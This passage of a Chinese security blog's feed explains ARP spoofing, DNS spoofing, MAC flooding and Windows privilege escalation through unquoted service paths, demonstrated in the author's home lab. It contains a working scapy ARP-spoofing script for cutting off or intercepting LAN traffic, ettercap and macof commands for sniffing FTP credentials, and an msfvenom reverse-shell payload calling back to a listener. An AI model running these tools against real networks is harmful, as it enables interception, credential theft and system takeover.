src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130431.png" alt="QQ截图20210217130431"></p><p>3.2服务端返回允许或拒绝</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130454.png" alt="QQ截图20210217130454"></p><ol start="4"><li>各种读写操作请求</li></ol><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130512.png" alt="QQ截图20210217130512"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;域，工作组，活动目录&quot;&gt;&lt;a href=&quot;#域，工作组，活动目录&quot; class=&quot;headerlink&quot; title=&quot;域，工作组，活动目录&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ARP欺骗&amp;DNS欺骗&amp;mac泛洪攻击</title>
    <link href="http://yoursite.com/2021/02/19/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2021/02/19/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</id>
    <published>2021-02-19T09:21:53.668Z</published>
    <updated>2021-02-19T08:51:01.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arp协议与欺骗"><a href="#arp协议与欺骗" class="headerlink" title="arp协议与欺骗"></a>arp协议与欺骗</h1><h2 id="简单概要："><a href="#简单概要：" class="headerlink" title="简单概要："></a>简单概要：</h2><p>通过此协议来获取局域网中某IP地址的mac地址</p><h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><p>在局域网中的机器互相发送消息时，靠的是mac地址（也叫以太网地址）来确定目的地址的，而我们只知道IP地址，所以需要arp协议来把ip地址映射为mac地址。 具体实现原理是，比如我想知道192.168.1.1的mac地址，就会在广播域里广播arp请求，ip不是192.168.1.1的主机会自动忽略请求，而192.168.1.1主机则会应答请求，并返回自己的mac地址(由IP定位到mac地址)</p><h2 id="arp高速缓存表："><a href="#arp高速缓存表：" class="headerlink" title="arp高速缓存表："></a>arp高速缓存表：</h2><p>这个表用来缓存 ip地址与mac地址 的对应关系<br>有动态表和静态表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">动态表随时间的推移自动添加和删除,每个动态arp缓存都有自己的TTL(生存时间).TTL为0就会被删</span><br><span class="line">静态表是永久性的，手动添加和删除。</span><br></pre></td></tr></table></figure><p><strong>局域网中ip到mac地址解析过程：</strong><br>1.当缓存表中存在目的IP对应的mac地址时 则直接返回与IP对应的mac地址<br>2.当缓存表中没有对应关系时,则向局域网中发送arp广播请求目的IP的mac，收到arp应答后将对应关系记录到高速缓存表中<br><strong>高速缓存表的优缺点</strong>：<br>优点：减少网络通信量，提高通信效率<br>缺点：会造成安全隐患</p><h2 id="arp分组格式"><a href="#arp分组格式" class="headerlink" title="arp分组格式"></a>arp分组格式</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144616.png" alt="QQ截图20210219144616"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.arp请求的目的mac地址  全f时代表广播地址</span><br><span class="line">2.arp请求的来源mac地址</span><br><span class="line">3.字段3 以太网帧类型表示的是后面的数据类型，ARP请求和ARP应答这个值为0x0806</span><br><span class="line">4.字段4 表示硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为1</span><br><span class="line">5.字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800</span><br><span class="line">67.字段6和7 表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节</span><br><span class="line">8.操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；</span><br><span class="line">               值为3，表示进行RARP请求；值为4，表示进行RARP应答。（重要）</span><br><span class="line">9.字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</span><br><span class="line">10.字段10 发送ARP请求或应答的IP地址。</span><br><span class="line">11 12.目的端的硬件地址和协议地址</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144723.png" alt="QQ截图20210219144723"></p><h2 id="免费arp"><a href="#免费arp" class="headerlink" title="免费arp"></a>免费arp</h2><p>免费arp是指主机发送arp查找自己的IP地址,发送端的协议地址和目的端的协议地址是一致的<br><strong>作用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(如某些网关设备会每隔一定时间广播一次免费arp，让网络中其他主机更新arp缓存表中网关的mac地址，缓解arp攻击效果)</span><br><span class="line">(如黑客可以使用免费arp，将虚假伪造的 ip mac对应关系通过arp广播出去，使网络中其他主机更新arp缓存表，更新完成后，这些主机的数据会转发到错误的mac地址，从而实现arp欺骗）</span><br><span class="line">2.检查广播域里的其他主机有没有使用自己的IP，如果使用了，则会弹出 IP冲突 字样</span><br><span class="line">免费arp与普通arp的区别:</span><br><span class="line">普通arp的请求是 我需要某ip的mac地址，该IP是其他机器的IP地址</span><br><span class="line">免费arp的请求是 我需要某IP的mac地址，该IP是机器自己的IP地址，起到宣告作用，发出去后是不希望得到回应的，若有回应则说明了IP冲突了</span><br></pre></td></tr></table></figure><h2 id="代理arp"><a href="#代理arp" class="headerlink" title="代理arp"></a>代理arp</h2><p>代理arp的意思是，一个主机把自己的mac地址给另一台机器使用来应答其他主机的arp请求。 实际上，这已经是某种意义上的arp欺骗</p><h2 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h2><h3 id="攻击原理："><a href="#攻击原理：" class="headerlink" title="攻击原理："></a>攻击原理：</h3><p>arp攻击就是伪造IP与mac的对应关系来实现arp欺骗，攻击者只要持续不断的发送伪造的arp响应包就能更改目标主机的arp缓存表，造成 断网攻击 或 中间人攻击</p><h3 id="利用arspoof实现断网攻击"><a href="#利用arspoof实现断网攻击" class="headerlink" title="利用arspoof实现断网攻击"></a>利用arspoof实现断网攻击</h3><p>用kali和物理机进行测试，kali是攻击机，物理机是受害者<br>首先收集kali，物理机，网关的ip地址和mac<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150147.png" alt="QQ截图20210219150147"></p><p>假设我们想要在实际中实施攻击，首先需要扫描局域网中的IP，但我们一个一个ping就很浪费时间了，所以需要fping命令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150203.png" alt="QQ截图20210219150203"><br>解读一下命令 arpspoof -i kali网卡名 -t 被攻击机ip 网关<br>好的，我们物理机成功被断网<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144847.png" alt="QQ截图20210219144847"></p><h2 id="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"><a href="#使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包" class="headerlink" title="使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包"></a>使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144946.png" alt="QQ截图20210219144946"><br>然后我们执行arpspoog指令<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145018.png" alt="QQ截图20210219145018"><br>此时我们物理机就能连上外网了<br><em>坑点:开启ip转发后物理机依旧不能连上外网.</em> 我的解决方法是重启一下，再修改以下ip_forward文件然后等一会，物理机就可以连上外网了.arp欺骗后物理机网可能会卡。<br>此时，物理机发给网关的通信信息我们都能获得到了，我们可以在虚拟机中使用driftnet工具捕获物理机正在浏览的图片<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145032.png" alt="QQ截图20210219145032"></p><h2 id="arp攻击的脚本编写："><a href="#arp攻击的脚本编写：" class="headerlink" title="arp攻击的脚本编写："></a>arp攻击的脚本编写：</h2><p>arp攻击脚本需要用到scapy库来帮助我们完成arp数据包的编写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">讲讲里面的一些函数(没有继续研究scapy库)</span><br><span class="line">get_if_hwaddr(&#39;网卡名&#39;)  &#x2F;&#x2F;获得自己的mac地址，一般填WLAN或eth0</span><br><span class="line">getmacbyip(&#39;ip)         &#x2F;&#x2F;获得某IP的mac地址</span><br><span class="line">srp(....)               &#x2F;&#x2F;发第二层包并返等待回应，返回值的第一个参数是回应包体。第二个参数是未回应包体</span><br><span class="line"></span><br><span class="line">sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))</span><br><span class="line">&#x2F;&#x2F;这是arp发包的构造 sendp是发第二层数据包并不等待回包 Ether是构造包体的意思</span><br><span class="line">&#x2F;&#x2F;a为自己的mac地址 b为目标机器的mac地址，</span><br><span class="line">&#x2F;&#x2F;c为发包的来源mac，d为发包的来源ip，e是目标机器的ip，f是arp操作类型字符</span><br><span class="line">&#x2F;&#x2F;arp欺骗的话，把d改成网关IP即可</span><br></pre></td></tr></table></figure><p>网上嫖的ip，mac扫描模块，这一步也可以手动获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ip地址扫描函数</span><br><span class="line">def im_scan(ipduan):</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br></pre></td></tr></table></figure><p>这个脚本仅能断网嗷,可以对单个机器断网，也可以断整个局域网的网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def im_scan(ipduan):#扫描</span><br><span class="line">    ipscan&#x3D;ipduan</span><br><span class="line">    try:</span><br><span class="line">        ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print (str(e))</span><br><span class="line">    else:</span><br><span class="line">        for snd,rcv in ans:</span><br><span class="line">            list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)</span><br><span class="line">            print (list_mac)</span><br><span class="line">            </span><br><span class="line">def arp_spoof(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    if tgt_ip:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2))</span><br><span class="line">    else:</span><br><span class="line">        while 1:</span><br><span class="line">            sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line">def arp_gate(tgt_ip,gateway_ip,iface):</span><br><span class="line">    mmac&#x3D;get_if_hwaddr(iface)</span><br><span class="line">    tgt_mac&#x3D;getmacbyip(tgt_ip)</span><br><span class="line">    while 1:</span><br><span class="line">        sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39;</span><br><span class="line">    tgt_ip&#x3D;&#39;192.168.0.104&#39; #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置</span><br><span class="line">    gateway_ip&#x3D;&#39;192.168.0.1&#39;</span><br><span class="line">    iface&#x3D;&#39;WLAN&#39;</span><br><span class="line">    threads_num&#x3D;20</span><br><span class="line">    print(&quot;如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置&quot;)</span><br><span class="line">    so_scan&#x3D;input(&quot;[+]要扫描局域网存活主机和它的mac吗[Y&#x2F;N]&quot;)</span><br><span class="line">    if so_scan&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">        im_scan(ipduan)</span><br><span class="line">    else:</span><br><span class="line">        so_judge&#x3D;input(&quot;[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y&#x2F;N]&quot;)</span><br><span class="line">        if so_judge&#x3D;&#x3D;&#39;Y&#39;:</span><br><span class="line">            try:</span><br><span class="line">                print(&#39;开始截胡机器发送往外界的数据&#39;)</span><br><span class="line">                time.sleep(3)</span><br><span class="line">                for i in range(threads_num):</span><br><span class="line">                    t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                    t1.start()</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">        else:</span><br><span class="line">            if tgt_ip:</span><br><span class="line">                try:</span><br><span class="line">                    print(&#39;开始截胡外界发往机器的数据&#39;)</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                    for i in range(threads_num):</span><br><span class="line">                        t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i))</span><br><span class="line">                        t2.start()</span><br><span class="line">                except KeyboardInterrupt:</span><br><span class="line">                    print(&#39;[+]stopppppppp&#39;)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;请设置tgt_ip&#39;)</span><br></pre></td></tr></table></figure><p>广播欺骗，受害机上的抓包效果 3c那个是我的mac地址<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145053.png" alt="QQ截图20210219145053"></p><h1 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h1><h2 id="dns工作原理"><a href="#dns工作原理" class="headerlink" title="dns工作原理"></a>dns工作原理</h2><p>dns（域名系统）将域名和IP地址相互映射，dns协议即域名解析协议，用来将用户输入的域名解析为IP。<br>具体一点，当用户访问某个域名如<a href="http://www.baidu.com/">www.baidu.com</a>时， 首先向本地dns发出请求<br>若本地dns缓存表无该域名IP映射关系，就会向根域名服务器发起查询，根域名服务器返回com域服务器地址给本地dns服务器<br>本地dns服务器向com域服务器发起查询，com域服务器返回baidu.com域服务器给本地dns服务器<br>本地dns服务器向baidu.com域服务器发起查询，baidu.com域服务器返回<a href="http://www.baidu.com/">www.baidu.com</a>地址</p><h2 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a>DNS欺骗原理</h2><p>在arp欺骗后获取到了受害机发起的dns请求包，然后返回一个自己构造的dns响应包，伪造自己想要的ip域名映射关系。<br>因为DNS欺骗是建立在arp欺骗基础上，arp欺骗又必须在局域网进行，故DNS欺骗也只能在局域网进行</p><h2 id="DNS欺骗工具实现"><a href="#DNS欺骗工具实现" class="headerlink" title="DNS欺骗工具实现"></a>DNS欺骗工具实现</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145146.png" alt="QQ截图20210219145146"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -T -q -P dns_spoof -M arp:remote &#x2F;受害者IP&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145220.png" alt="QQ截图20210219145220"></p><h1 id="mac泛洪攻击"><a href="#mac泛洪攻击" class="headerlink" title="mac泛洪攻击"></a>mac泛洪攻击</h1><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机:"></a>交换机:</h2><p>交换机，只能做有线链接，所以拿这个是不能用作wifi的。<br>交换机的作用是转发局域网内两台机器之间的互相的请求（有线连接的机器）。</p><p>交换机具体传输数据帧的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设主机A第一次向主机B发送数据</span><br><span class="line">主机A向交换机发起一个源mac地址为自己，目标mac地址为主机B的数据帧</span><br><span class="line">交换机收到后，将源mac地址和其对应接口记录到mac地址表中（mac地址表与arp缓存表有区别）</span><br><span class="line">交换机在自己的mac地址表中检查是否有目标mac的信息，如果有则向目标mac接口转发数据帧，如果没有，就会向所以非数据来源接口的接口广播该数据帧（mac泛洪攻击原理）</span><br><span class="line">局域网内主机都收到了此数据帧，但只有主机B会响应该数据帧并且回应，回应信息里注明主机B的mac地址以便记录到mac地址表，其他主机都不会有反应。</span><br><span class="line">交换机接收到主机B的回应后，会记录其mac 接口的映射关系，以后AB通信时会调用mac地址表中的记录，实现单播</span><br></pre></td></tr></table></figure><h2 id="mac表与arp缓存表的区别"><a href="#mac表与arp缓存表的区别" class="headerlink" title="mac表与arp缓存表的区别"></a>mac表与arp缓存表的区别</h2><p>mac表记录在交换机中，用于记录接口 mac地址的对应关系<br>arp缓存表记录在本机中，用于记录IP mac地址的对应关系</p><h2 id="交换机mac表的学习机制："><a href="#交换机mac表的学习机制：" class="headerlink" title="交换机mac表的学习机制："></a>交换机mac表的学习机制：</h2><p>mac表一般都是有大小限制的，一旦mac表满了，其他mac地址就加不进来了。<br>一旦其他mac地址加不进来了，那么mac表就无法进一步学习，之后的所有请求都会被广播到局域网，实现泛洪。<br>mac表是有老化机制的，若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址删除，等下一次通信时再学习。</p><h2 id="泛洪攻击原理："><a href="#泛洪攻击原理：" class="headerlink" title="泛洪攻击原理："></a>泛洪攻击原理：</h2><p>泛洪攻击的目的是获取主机之间的通信数据，要达到这个目的则需要强迫交换机把接收到的数据帧统统广播出来。泛洪攻击原理则是向交换机发送大量未知mac地址让交换机不停学习，把mac表充满，这样正常主机mac地址老化后就无法再添加到mac地址表中，以后的所有通信数据都会被广播出来</p><h2 id="使用kali上的macof来进行泛洪攻击"><a href="#使用kali上的macof来进行泛洪攻击" class="headerlink" title="使用kali上的macof来进行泛洪攻击"></a>使用kali上的macof来进行泛洪攻击</h2><p>目前有三台机器<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145424.png" alt="QQ截图20210219145424"><br>我们试着截获物理机登录ftp服务器时的账户与密码<br>先使用命令macof，让交换机的mac表被占满<br>仅输入macof即可<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145448.png" alt="QQ截图20210219145448"><br>输入tcpdump -nn -X -i eth0 tcp port 21开始抓包（建议不用wireshark，是因为同一时间macof命令发出的数据包太多了，用wireshark会巨卡）<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145510.png" alt="QQ截图20210219145510"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png" alt="QQ截图20210219145527"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145527.png"></p><p>下面是抓http包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145603.png" alt="QQ截图20210219145603"></p><h2 id="mac泛洪攻击的局限性"><a href="#mac泛洪攻击的局限性" class="headerlink" title="mac泛洪攻击的局限性:"></a>mac泛洪攻击的局限性:</h2><p>只能在局域网内攻击另一个局域网内机器.<br>且攻击目标必须和自己用交换机有线连接起来<br>也就是说你的电脑发起mac泛洪是攻击不到你的手机的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;arp协议与欺骗&quot;&gt;&lt;a href=&quot;#arp协议与欺骗&quot; class=&quot;headerlink&quot; title=&quot;arp协议与欺骗&quot;&gt;&lt;/a&gt;arp协议与欺骗&lt;/h1&gt;&lt;h2 id=&quot;简单概要：&quot;&gt;&lt;a href=&quot;#简单概要：&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows提权方法汇总</title>
    <link href="http://yoursite.com/2021/02/19/Windows%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2021/02/19/Windows%E6%8F%90%E6%9D%83/</id>
    <published>2021-02-19T09:21:51.308Z</published>
    <updated>2021-02-19T08:50:44.681Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无引号服务路径-（-Trusted-Service-Paths-）"><a href="#无引号服务路径-（-Trusted-Service-Paths-）" class="headerlink" title="无引号服务路径 （ Trusted Service Paths ）"></a>无引号服务路径 （ <strong>Trusted Service Paths</strong> ）</h2><p>先说实用度，比较被动，而且比较看脸。</p><p>Windows下服务的权限通常是SYSTEM。如果我们能够替换服务的启动程序为我们的恶意程序（如反弹shell），即相当于获得了SYSTEM权限，达到了提权的目的。<br>无引号服务路径有可能会导致这种情况的发生。<br>所谓无引号服务路径，就是服务启动程序的路径中包含了空格且未被引号包含起来。比如这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\floder1\service.exe</span><br></pre></td></tr></table></figure><p>因为空格的存在，Windows在启动服务找寻服务启动项时，它会按照以下顺序进行启动项寻找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>这就给了我们有机可乘的机会：如果我们在服务的上层目录有写入或完全控制权限，我们完全可以将一个可执行文件放在Windows搜寻服务启动项的更靠前顺序上。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143921.png" alt="QQ截图20210217143921"></p><p>我们用以下命令来搜索哪些服务路径没有包含引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>找到一个。接下来我们的思路可能就是在2345Explorer目录下创建一个Protect.exe了，所以我们要看看2345Explorer目录我们的权限如何。</p><p>先来一手whoami /all.发现自己是Users组的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143934.png" alt="QQ截图20210217143934"></p><p>然后使用icacls命令查看在2345Explorer目录的权限如何</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143945.png" alt="QQ截图20210217143945"></p><p>users组是完全控制权（F），那么我们直接用msfvenom构造一个反弹shell的exe。命名为Protect.exe，放入2345Explorer目录。我这里随便编码了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http -e x86&#x2F;shikata_ga_nai LHOST&#x3D;192.168.111.129 LPORT&#x3D;10068 -f exe -o Protect.exe</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144053.png" alt="QQ截图20210217144053"></p><p>然后我们现在是没有能力重启服务的。。只能等管理员重启服务或者机子重启。然后就拿到SYSTEM权限了。但是这里还有一个坑点，这个坑点是如果一个服务启动后在一定时间内未与 Service Control Manager(SCM) 通讯，就会被停止。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144102.png" alt="QQ截图20210217144102"></p><p>所以我们要在拿到shell后及时的转移进程或者添加管理员账户。<br>转移进程在msf中很简单，meterpreter中先用ps查看进程，随便找一个system权限，记住其pid，然后 migrate PID 即可完成进程迁移。</p><p>下面来说说防治方法吧。进入注册表修改窗口，在 HKEY_LOCAL_MACHINE &gt;&gt; SYSTEM &gt;&gt; CurrentControlSet &gt;&gt; Services 路径下找到存在漏洞的服务，修改其ImagePath，把路径前后加个引号就可了。</p><h2 id="易受攻击的服务（Vulnerable-Services-）"><a href="#易受攻击的服务（Vulnerable-Services-）" class="headerlink" title="易受攻击的服务（Vulnerable Services ）"></a>易受攻击的服务（<strong>Vulnerable Services</strong> ）</h2><p>同样看脸且被动</p><p>这个攻击方法大致分两类<br>1.替换服务的二进制文件。这个方法较为简单，如果对服务二进制文件所在目录有修改权，那么我们完全可以创建一个恶意程序来替换原有的二进制文件服务。这个比较简单，而且基本上攻击流程和<strong>Trusted Service Paths</strong>如出一辙，同样也是比较被动地等待重启服务才能弹shell，就不再演示了。<br>2.修改服务的属性。如果我们能修改服务的 <strong>BINARY_PATH_NAME</strong> 属性（这个属性用于指向服务的二进制文件），我们就可以通过设置 <strong>BINARY_PATH_NAME</strong> 